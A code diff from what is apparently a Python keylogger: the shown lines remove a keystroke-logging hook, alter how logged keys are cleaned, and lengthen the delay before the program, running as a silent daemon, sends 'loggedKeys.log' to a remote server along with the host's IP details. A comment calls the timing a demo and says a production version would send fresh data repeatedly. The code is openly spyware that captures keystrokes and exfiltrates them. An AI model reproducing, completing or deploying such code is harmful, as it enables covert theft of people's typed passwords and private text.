@@ -114,14 +114,6 @@ def getIPaddr():
 
     return host, ip, external_ip    
 
-
-def OnKeyPress(event):
-    with open(log_file, 'a') as f:
-        f.write('{}\n'.format(event.Key))
-
-    if event.Ascii == cancel_key:
-        new_hook.cancel()
-
 def connect(keyLoc):
     '''
     This function handles connecting to the server on the behalf of the caller
@@ -194,7 +186,7 @@ def sendFile(dataFile,  keyLoc, filename):
         filename=filename.encode('utf-8')
         chan.sendall(filename)
         with open(dataFile, 'r') as file:
-            data = file.read().replace('\n', '').replace('space', ' ').replace('BackSpace',  '').replace('á', '')
+            data = file.read().replace('\n', '').replace('space', ' ').replace('BackSpace',  '')
         
         chan.sendall(data.encode('utf-8'))
     
@@ -249,8 +241,7 @@ def run( stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
 
     #For demo purposes, the time between sending of logged data is shortened
     # additionally, a production version would continously call the sendFile after a random seconds with new data
-    time.sleep(20)
-
+    time.sleep(30)
 
     # path exists, send the file back to daemon
     sendFile(cwd+"/loggedKeys.log", keyLoc,  'keylog.txt') 
